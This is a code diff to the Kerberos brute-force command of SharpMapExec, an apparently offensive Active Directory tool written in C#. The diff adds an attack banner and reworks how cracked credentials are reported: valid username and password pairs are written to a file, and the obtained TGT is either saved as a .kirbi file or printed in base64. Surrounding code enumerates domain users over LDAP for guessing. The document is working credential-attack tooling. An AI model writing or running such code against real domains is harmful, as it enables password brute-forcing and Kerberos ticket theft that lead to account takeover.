@@ -36,6 +36,7 @@ namespace SharpMapExec.Commands
 
         public void Execute(Dictionary<string, string> arguments)
         {
+            Console.WriteLine("\r\n[*] Action: Perform Kerberos Brute Force\r\n");
             try
             {
                 this.ParseArguments(arguments);
@@ -137,6 +138,7 @@ namespace SharpMapExec.Commands
 
                 this.credPassword = arguments["/credpassword"];
             }
+
         }
 
         private void ParsePasswords(Dictionary<string, string> arguments)
@@ -223,6 +225,7 @@ namespace SharpMapExec.Commands
 
         private string[] DomainUsernames()
         {
+
             string domainController = this.DomainController();
             string bindPath = this.BindPath(domainController);
             DirectoryEntry directoryObject = new DirectoryEntry(bindPath);
@@ -241,6 +244,7 @@ namespace SharpMapExec.Commands
 
                 Console.WriteLine("[*] Using alternate creds  : {0}\r\n", userDomain);
             }
+
 
             DirectorySearcher userSearcher = new DirectorySearcher(directoryObject);
             userSearcher.Filter = "(samAccountType=805306368)";
@@ -281,6 +285,7 @@ namespace SharpMapExec.Commands
         private string DomainController()
         {
             string domainController = null;
+
 
             if (String.IsNullOrEmpty(this.dc))
             {
@@ -324,10 +329,13 @@ namespace SharpMapExec.Commands
                 return pc.ValidateCredentials(this.credUser, this.credPassword);
             }
         }
+
     }
+
 
     public class BruteforceConsoleReporter : IBruteforcerReporter
     {
+
         private uint verbose;
         private string passwordsOutfile;
         private bool saveTicket;
@@ -340,13 +348,18 @@ namespace SharpMapExec.Commands
             this.saveTicket = saveTicket;
         }
 
-        public void ReportValidPassword(string domain, string username, string password, byte[] ticket)
+        public void ReportValidPassword(string domain, string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE)
         {
-            Console.WriteLine("[+] STUPENDOUS => {0}:{1}", username, password);
             this.WriteUserPasswordToFile(username, password);
-            string ticketFilename = username + ".kirbi";
-            File.WriteAllBytes(ticketFilename, ticket);
-            Console.WriteLine("[*] Saved TGT into {0}", ticketFilename);
+            if (ticket != null)
+            {
+                Console.WriteLine("[+] STUPENDOUS => {0}:{1}", username, password);
+                this.HandleTicket(username, ticket);
+            }
+            else
+            {
+                Console.WriteLine("[+] UNLUCKY => {0}:{1} ({2})", username, password, err);
+            }
         }
 
         public void ReportValidUser(string domain, string username)
@@ -376,6 +389,7 @@ namespace SharpMapExec.Commands
                     krbError.error_code, (Interop.KERBEROS_ERROR)krbError.error_code);
         }
 
+
         private void WriteUserPasswordToFile(string username, string password)
         {
             if (String.IsNullOrEmpty(this.passwordsOutfile))
@@ -397,5 +411,32 @@ namespace SharpMapExec.Commands
                 }
             }
         }
+
+        private void HandleTicket(string username, byte[] ticket)
+        {
+            if (this.saveTicket)
+            {
+                string ticketFilename = username + ".kirbi";
+                File.WriteAllBytes(ticketFilename, ticket);
+                Console.WriteLine("[*] Saved TGT into {0}", ticketFilename);
+            }
+            else
+            {
+                this.PrintTicketBase64(username, ticket);
+            }
+        }
+
+        private void PrintTicketBase64(string ticketname, byte[] ticket)
+        {
+            string ticketB64 = Convert.ToBase64String(ticket);
+
+            Console.WriteLine("[*] base64({0}.kirbi):\r\n", ticketname);
+
+            // display in columns of 80 chararacters
+            Console.WriteLine("      {0}", ticketB64);
+
+            Console.WriteLine("\r\n", ticketname);
+        }
+
     }
 }
